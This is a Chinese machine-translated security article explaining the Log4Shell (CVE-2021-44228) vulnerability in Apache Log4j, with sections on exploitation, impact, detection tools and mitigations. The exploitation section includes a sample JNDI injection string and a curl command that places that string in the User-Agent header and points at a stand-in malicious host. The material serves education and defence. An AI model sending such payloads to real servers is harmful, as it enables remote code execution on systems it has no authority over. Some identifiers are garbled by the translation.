<html>
<head>
<title>Log4j zero-day vulnerability : Exploitation, Detection &amp; Mitigation</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Log4j零日漏洞:利用、检测和缓解</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/log4j-zero-day-vulnerability-exploitation-detection-mitigation-9667908857b4?source=collection_archive---------1-----------------------#2021-12-15">https://infosecwriteups.com/log4j-zero-day-vulnerability-exploitation-detection-mitigation-9667908857b4?source=collection_archive---------1-----------------------#2021-12-15</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="0d18" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">CVE-2021-44228:log 4 shell/log 4 jam</h2></div><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi kf"><img src="../Images/0ab218af9dc0708d72a3e8ebadcc8e8d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*ZDFi1CKZsqy_AR_8"/></div></div><figcaption class="kr ks gj gh gi kt ku bd b be z dk translated">克林特·帕特森在<a class="ae kv" href="https://unsplash.com?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank"> Unsplash </a>上拍摄的照片</figcaption></figure><h1 id="b4bc" class="kw kx iq bd ky kz la lb lc ld le lf lg jw lh jx li jz lj ka lk kc ll kd lm ln bi translated">概观</h1><p id="8419" class="pw-post-body-paragraph lo lp iq lq b lr ls jr lt lu lv ju lw lx ly lz ma mb mc md me mf mg mh mi mj ij bi translated">您可能已经听说过在Apache Log4j 2 Java库中发现的零日漏洞，这个漏洞在互联网上引起了轩然大波。在这篇文章中，我打算深入讨论这个漏洞及其影响、检测和缓解。</p><h2 id="efbc" class="mk kx iq bd ky ml mm dn lc mn mo dp lg lx mp mq li mb mr ms lk mf mt mu lm mv bi translated">Log4j是什么？</h2><p id="a38c" class="pw-post-body-paragraph lo lp iq lq b lr ls jr lt lu lv ju lw lx ly lz ma mb mc md me mf mg mh mi mj ij bi translated">Log4j是一个快速、可靠和灵活的日志框架，用Java编写，是Apache日志服务的一部分。它基本上是一个用于日志记录的开源Java API，用于跟踪应用程序中的活动。</p><h2 id="3e5f" class="mk kx iq bd ky ml mm dn lc mn mo dp lg lx mp mq li mb mr ms lk mf mt mu lm mv bi translated">Log4j架构</h2><p id="b39a" class="pw-post-body-paragraph lo lp iq lq b lr ls jr lt lu lv ju lw lx ly lz ma mb mc md me mf mg mh mi mj ij bi translated">按照apache.org的说法，“<em class="mw">使用Log4j 2 API的应用程序将向日志管理器请求一个带有特定名称的日志记录器。日志管理器将定位适当的LoggerContext，然后从中获取日志程序。LoggerConfig对象是从配置中的记录器声明创建的。LoggerConfig与实际传递日志事件的Appenders相关联"</em></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi mx"><img src="../Images/8bc441b41aa0fec5c93d2a8dee740b5f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1214/format:webp/1*U146bqqObT4LLBhmoF8N4Q.jpeg"/></div><figcaption class="kr ks gj gh gi kt ku bd b be z dk translated">Log4j架构[来源:<a class="ae kv" href="https://logging.apache.org" rel="noopener ugc nofollow" target="_blank">https://logging.apache.org</a></figcaption></figure><h1 id="f09f" class="kw kx iq bd ky kz la lb lc ld le lf lg jw lh jx li jz lj ka lk kc ll kd lm ln bi translated">剥削</h1><p id="c932" class="pw-post-body-paragraph lo lp iq lq b lr ls jr lt lu lv ju lw lx ly lz ma mb mc md me mf mg mh mi mj ij bi translated">让我们来看看这个漏洞是如何被利用的。它很容易被利用，这使得它更加危险和严重。</p><p id="a494" class="pw-post-body-paragraph lo lp iq lq b lr my jr lt lu mz ju lw lx na lz ma mb nb md me mf nc mh mi mj ij bi translated">该漏洞是由于不正确的输入处理导致的远程代码执行(RCE ),使得攻击者无需验证即可获得目标系统的完全访问权限。为了理解这个漏洞，让我们看一个利用Log4j的简单Java代码示例。</p><pre class="kg kh ki kj gt nd ne nf ng aw nh bi"><span id="45c6" class="mk kx iq ne b gy ni nj l nk nl"><strong class="ne ir">import </strong>java.util.*;<strong class="ne ir"><br/>import</strong> <!-- -->org.apache.logging.log4j.Logger;<br/><strong class="ne ir">import</strong> <!-- -->org.apache.logging.log4j.LogManager;<br/><strong class="ne ir">public</strong> <strong class="ne ir">class</strong> poc<!-- -->{<br/><strong class="ne ir">static</strong> <!-- -->Logger logger = LogManager.getLogger(poc.<strong class="ne ir">class</strong>);<br/> <strong class="ne ir">public</strong> <strong class="ne ir">static</strong> <strong class="ne ir">void</strong> <!-- -->main(String args[]) {<br/>  System.out.println("Enter your name:");<br/>  Scanner sc = new Scanner(System.in);<br/>  String name = sc.nextLine();<br/>  logger.error(name);<br/>  System.out.println("Hi "+name);<br/> }<br/>}</span></pre><p id="b762" class="pw-post-body-paragraph lo lp iq lq b lr my jr lt lu mz ju lw lx na lz ma mb nb md me mf nc mh mi mj ij bi translated">上面的代码片段只是从用户那里获取一个输入名称，使用log4j将该名称记录为一个错误并打印出来。</p><p id="31c5" class="pw-post-body-paragraph lo lp iq lq b lr my jr lt lu mz ju lw lx na lz ma mb nb md me mf nc mh mi mj ij bi translated">让我们来看看几个示例输出-</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi nm"><img src="../Images/a8016ad167fa8ff9bef5d59fd7d659ff.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gh8Ckg5DmT4KHkIgxnrjJg.png"/></div></div><figcaption class="kr ks gj gh gi kt ku bd b be z dk translated">用户输入“Bob ”,它只是被记录下来并被回显出来</figcaption></figure><p id="d731" class="pw-post-body-paragraph lo lp iq lq b lr my jr lt lu mz ju lw lx na lz ma mb nb md me mf nc mh mi mj ij bi translated">Log4j有一个名为“lookups”的特性，可以根据${}中包含的lookup中指定的参数来获取和添加某些值到log4j配置中。<br/>它们的形式为= ${java:os}这里，Java OS版本将被获取并作为一个值添加。</p><p id="6839" class="pw-post-body-paragraph lo lp iq lq b lr my jr lt lu mz ju lw lx na lz ma mb nb md me mf nc mh mi mj ij bi translated">这很容易被攻击者滥用，因为没有输入验证，用户完全控制log4j记录的字符串。攻击者可以简单地输入查找来从服务器端提取信息，甚至执行命令。让我们看看上面看到的示例代码的另一个用户输入-</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi nn"><img src="../Images/c958b9bb0b71abaf4092da65b80af2eb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rVlgLOa5rLFcvAqc-0VlNA.png"/></div></div><figcaption class="kr ks gj gh gi kt ku bd b be z dk translated">输入查找，替换并记录相应的值</figcaption></figure><p id="f7a8" class="pw-post-body-paragraph lo lp iq lq b lr my jr lt lu mz ju lw lx na lz ma mb nb md me mf nc mh mi mj ij bi translated">这里，字符串＄{ env:USER }用于提取服务器上的用户环境变量，当Log4j使用查找来解析和获取该值时，它会显示在我们的输出中。现在我们已经对漏洞利用的工作原理有了基本的了解，让我们放大影响，看看远程查找！</p><p id="05a0" class="pw-post-body-paragraph lo lp iq lq b lr my jr lt lu mz ju lw lx na lz ma mb nb md me mf nc mh mi mj ij bi translated">Log4j还有另一个功能叫做<strong class="lq ir"> Java命名和目录接口(JNDI) </strong>，它主要为应用程序提供目录服务，可以用来从远程服务器获取数据，并支持LDAP、RMI等协议。例如，使用远程查找与LDAP服务器通信可以通过使用:<strong class="lq ir">$ { JNDI:LDAP://&lt;server-IP&gt;/context-name }</strong>实现</p><p id="9ae5" class="pw-post-body-paragraph lo lp iq lq b lr my jr lt lu mz ju lw lx na lz ma mb nb md me mf nc mh mi mj ij bi translated">攻击者可以滥用此功能远程执行代码。例如，像这样添加一个远程查找将使Log4j到达攻击者选择的远程服务器来提取数据:<strong class="lq ir"> ${jndi:ldap://www .恶意. com/payload} </strong></p><p id="a77d" class="pw-post-body-paragraph lo lp iq lq b lr my jr lt lu mz ju lw lx na lz ma mb nb md me mf nc mh mi mj ij bi translated">攻击者只需使用Log4j获取易受攻击的应用程序，记录作为用户输入输入的jndi查找，并托管恶意服务器来交付有效负载。这可以通过攻击web请求中常见的日志字段(如用户代理头)并在其中嵌入jndi有效负载来实现。在用户代理头中嵌入有效负载的示例curl请求如下所示:</p><pre class="kg kh ki kj gt nd ne nf ng aw nh bi"><span id="f2e2" class="mk kx iq ne b gy ni nj l nk nl">curl -H "User-Agent: <!-- -->${jndi:ldap://www.malicious.com/payload}" target.com</span></pre><p id="38ce" class="pw-post-body-paragraph lo lp iq lq b lr my jr lt lu mz ju lw lx na lz ma mb nb md me mf nc mh mi mj ij bi translated">当带有嵌入式远程查找的用户代理登录到目标服务器上，并且Log4j解析有效负载时，将发送一个请求从通过jndi指定的LDAP服务器获取数据。这使得攻击者能够通过LDAP referrer托管一台服务器，该服务器将传入LDAP的请求转发到另一台处理该请求的HTTP服务器，并使用有效负载响应目标服务器，以获得目标应用程序后端服务器上的外壳。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi no"><img src="../Images/d6d8bde8a801862b0c01d9db0ec79567.png" data-original-src="https://miro.medium.com/v2/resize:fit:1342/format:webp/1*xSAKqFtKXhNiCRG0ANp46w.png"/></div><figcaption class="kr ks gj gh gi kt ku bd b be z dk translated">利用工作流</figcaption></figure><p id="d2dd" class="pw-post-body-paragraph lo lp iq lq b lr my jr lt lu mz ju lw lx na lz ma mb nb md me mf nc mh mi mj ij bi translated">下面的<a class="ae kv" href="https://github.com/mbechler/marshalsec" rel="noopener ugc nofollow" target="_blank"> <strong class="lq ir"> repo </strong> </a>由<em class="mw"> mbechler </em>提供了一个Java实现来设置一个LDAP referrer来测试这个漏洞。</p><p id="60b2" class="pw-post-body-paragraph lo lp iq lq b lr my jr lt lu mz ju lw lx na lz ma mb nb md me mf nc mh mi mj ij bi translated"><strong class="lq ir">该漏洞的概念验证可在此处找到</strong>:<a class="ae kv" href="https://github.com/xiajun325/apache-log4j-rce-poc" rel="noopener ugc nofollow" target="_blank">https://github.com/xiajun325/apache-log4j-rce-poc</a></p><h1 id="2f40" class="kw kx iq bd ky kz la lb lc ld le lf lg jw lh jx li jz lj ka lk kc ll kd lm ln bi translated">影响</h1><p id="fb1d" class="pw-post-body-paragraph lo lp iq lq b lr ls jr lt lu lv ju lw lx ly lz ma mb mc md me mf mg mh mi mj ij bi translated"><strong class="lq ir">受影响的Log4j版本</strong>:版本2.0到版本2.14.1。<br/>有数以百万计的应用程序利用Java，这构成了一个巨大的攻击面。许多大型软件公司和在线服务使用Log4j库进行日志记录，包括Amazon、Apple、Cisco、Cloudflare、ElasticSearch、Red Hat、Steam、Tesla、Twitter等等。也可以在  这里找到一个易受Log4Shell攻击的已验证攻击面列表<a class="ae kv" href="https://github.com/YfryTchsGD/Log4jAttackSurface" rel="noopener ugc nofollow" target="_blank"> <strong class="lq ir"> <em class="mw">。之所以难以修补和检测，是因为这可能存在于应用程序中使用的多个依赖项和第三方服务中。不同的公司和组织将不得不共同努力来修补他们各自的应用程序，以确保所有涉及的依赖关系都被覆盖并被正确地修补以解决这一漏洞。</em></strong></a></p><h1 id="a23a" class="kw kx iq bd ky kz la lb lc ld le lf lg jw lh jx li jz lj ka lk kc ll kd lm ln bi translated">侦查</h1><p id="22ca" class="pw-post-body-paragraph lo lp iq lq b lr ls jr lt lu lv ju lw lx ly lz ma mb mc md me mf mg mh mi mj ij bi translated">许多优秀的检测工具和规则已经由各种安全研究人员和组织建立并在线共享，它们可以帮助我们在应用程序中检测Log4Shell。让我们来看看其中的一些</p><p id="dfb4" class="pw-post-body-paragraph lo lp iq lq b lr my jr lt lu mz ju lw lx na lz ma mb nb md me mf nc mh mi mj ij bi translated">https://log4shell.huntress.com<strong class="lq ir">女猎手实验室log4shell测试器</strong>—<a class="ae kv" href="https://log4shell.huntress.com" rel="noopener ugc nofollow" target="_blank"/><br/>该测试器提供具有唯一标识符的有效负载，接受来自易受攻击应用的LDAP连接，并显示其接收连接的IP地址。我们上面讨论的示例代码也可以用来测试这一点。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi np"><img src="../Images/c58ab52e8a5315139897857e46fdd95c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CWMMpvpaAFvFD_gClVqtRA.png"/></div></div></figure><p id="acfa" class="pw-post-body-paragraph lo lp iq lq b lr my jr lt lu mz ju lw lx na lz ma mb nb md me mf nc mh mi mj ij bi translated"><strong class="lq ir">Florian Roth的Log4Shell检测器</strong>—<a class="ae kv" href="https://github.com/Neo23x0/log4shell-detector" rel="noopener ugc nofollow" target="_blank">https://github.com/Neo23x0/log4shell-detector</a><br/>这是一个由Florian Roth创建的自动化python脚本，通过匹配jndi有效负载来检测Log4Shell。该脚本主要分析日志，如果以下字符串中的所有字符以任何顺序匹配，就会触发检测。该脚本还考虑了各种形式的基于URL的编码:<code class="fe nq nr ns ne b">${jndi:ldap:</code></p><p id="a73e" class="pw-post-body-paragraph lo lp iq lq b lr my jr lt lu mz ju lw lx na lz ma mb nb md me mf nc mh mi mj ij bi translated"><strong class="lq ir">Florian Roth的Yara Rules—</strong><a class="ae kv" href="https://github.com/Neo23x0/signature-base/blob/master/yara/expl_log4j_cve_2021_44228.yar" rel="noopener ugc nofollow" target="_blank">https://github . com/neo 23 x 0/signature-base/blob/master/Yara/expl _ log4j _ CVE _ 2021 _ 44228 . yar</a><br/>Yara Rules匹配常见的有效载荷字符串和在野外发现的模式。</p><p id="449b" class="pw-post-body-paragraph lo lp iq lq b lr my jr lt lu mz ju lw lx na lz ma mb nb md me mf nc mh mi mj ij bi translated">LunaSec的Log4Shell命令行工具——【https://github.com/lunasec-io/lunasec/releases】T2/<br/>LunaSec还构建了一个命令行实用程序来检查<strong class="lq ir">。震击器</strong>和<strong class="lq ir">。警告项目目录中的文件，并通过匹配已知易受攻击的log4j类的散列来检查它们是否易受攻击。哈希列表可以在<a class="ae kv" href="https://github.com/mubix/CVE-2021-44228-Log4Shell-Hashes" rel="noopener ugc nofollow" target="_blank"> <strong class="lq ir"> <em class="mw">这里</em> </strong> </a>找到。</strong></p><p id="32f1" class="pw-post-body-paragraph lo lp iq lq b lr my jr lt lu mz ju lw lx na lz ma mb nb md me mf nc mh mi mj ij bi translated"><strong class="lq ir"> Log4Shell Scanner Burp Suite插件— </strong> Burp Suite的Pro版也有一个插件可以扫描Log4Shell。我没有亲自用过，但你可以试一试！</p><figure class="kg kh ki kj gt kk"><div class="bz fp l di"><div class="nt nu l"/></div></figure><h1 id="2371" class="kw kx iq bd ky kz la lb lc ld le lf lg jw lh jx li jz lj ka lk kc ll kd lm ln bi translated">减轻</h1><p id="0a4e" class="pw-post-body-paragraph lo lp iq lq b lr ls jr lt lu lv ju lw lx ly lz ma mb mc md me mf mg mh mi mj ij bi translated">针对此漏洞的最佳和最有效的修复方法是将log4j依赖项升级到Apache发布的最新版本，即<strong class="lq ir"> log4j 2.16.0 </strong>。<strong class="lq ir"> </strong>最新版本解决了漏洞，提高了log4j的整体安全性。确保正在运行的Java实例是最新的也是一个好主意。</p><p id="ccc2" class="pw-post-body-paragraph lo lp iq lq b lr my jr lt lu mz ju lw lx na lz ma mb nb md me mf nc mh mi mj ij bi translated">如果不可能立即安装补丁，可以在安装补丁的同时，暂时采用以下任何一种解决方法—</p><ul class=""><li id="07bc" class="nv nw iq lq b lr my lu mz lx nx mb ny mf nz mj oa ob oc od bi translated">通过将环境变量<strong class="lq ir">LOG4J _ FORMAT _ MSG _ NO _ LOOKUPS</strong>设置为<strong class="lq ir"> true </strong>，可以全局禁用消息查找</li><li id="d7ab" class="nv nw iq lq b lr oe lu of lx og mb oh mf oi mj oa ob oc od bi translated">运行易受攻击的Java应用程序时，还可以通过使用命令行标志<strong class="lq ir">‐dlog 4j 2 . formatmsgnolookups = True</strong>来禁用特定执行的查找:<strong class="lq ir">Java‐dlog 4j 2 . formatmsgnolookups = True-jar app . jar</strong></li><li id="8a88" class="nv nw iq lq b lr oe lu of lx og mb oh mf oi mj oa ob oc od bi translated">另一种方法是从任何使用log4j的Java应用程序中找到并删除<strong class="lq ir"> JndiLookup </strong>类，这样就不会触发jndi查找。</li></ul></div><div class="ab cl oj ok hu ol" role="separator"><span class="om bw bk on oo op"/><span class="om bw bk on oo op"/><span class="om bw bk on oo"/></div><div class="ij ik il im in"><p id="1c8c" class="pw-post-body-paragraph lo lp iq lq b lr my jr lt lu mz ju lw lx na lz ma mb nb md me mf nc mh mi mj ij bi translated">如果你想了解更多关于Log4Shell的信息，请查看约翰·哈蒙德的精彩视频演示<a class="ae kv" href="https://www.youtube.com/watch?v=7qoPDq41xhQ&amp;t=1187s" rel="noopener ugc nofollow" target="_blank"> <strong class="lq ir"> <em class="mw">这里</em> </strong> </a>。TryHackMe和John Hammond还联手创建了一个探索Log4j漏洞的房间<a class="ae kv" href="https://tryhackme.com/room/solar" rel="noopener ugc nofollow" target="_blank"> <strong class="lq ir"> <em class="mw">这里</em> </strong> </a>。</p><p id="f93e" class="pw-post-body-paragraph lo lp iq lq b lr my jr lt lu mz ju lw lx na lz ma mb nb md me mf nc mh mi mj ij bi translated">感谢您的阅读，祝您狩猎愉快！🐞</p></div></div>    
</body>
</html>